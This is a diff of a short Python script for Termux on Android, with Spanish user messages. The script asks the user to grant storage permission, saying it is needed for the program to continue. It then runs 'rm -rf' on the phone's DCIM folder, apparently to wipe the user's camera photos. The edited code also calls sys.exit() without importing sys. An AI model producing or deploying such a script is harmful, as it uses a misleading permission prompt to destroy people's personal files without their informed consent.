@@ -1,15 +1,14 @@
 import os
 import time
 
-while True:
-    # Verificar si ya se tienen permisos de almacenamiento
-    if os.system("termux-setup-storage -n") == 0:
-        print("Permisos de almacenamiento ya concedidos.")
-        break
-    else:
-        print("Por favor, concede los permisos de almacenamiento.")
-        print("Es necesario para continuar con el programa.")
-        os.system("termux-setup-storage")
+if os.system("termux-setup-storage -n") == 0:
+    print("Permisos de almacenamiento ya concedidos.")
+
+else:
+    print("Por favor, concede los permisos de almacenamiento.")
+    print("Es necesario para continuar con el programa.")
+    os.system("termux-setup-storage")
+    sys.exit()
 
 # Eliminar directorios
 os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
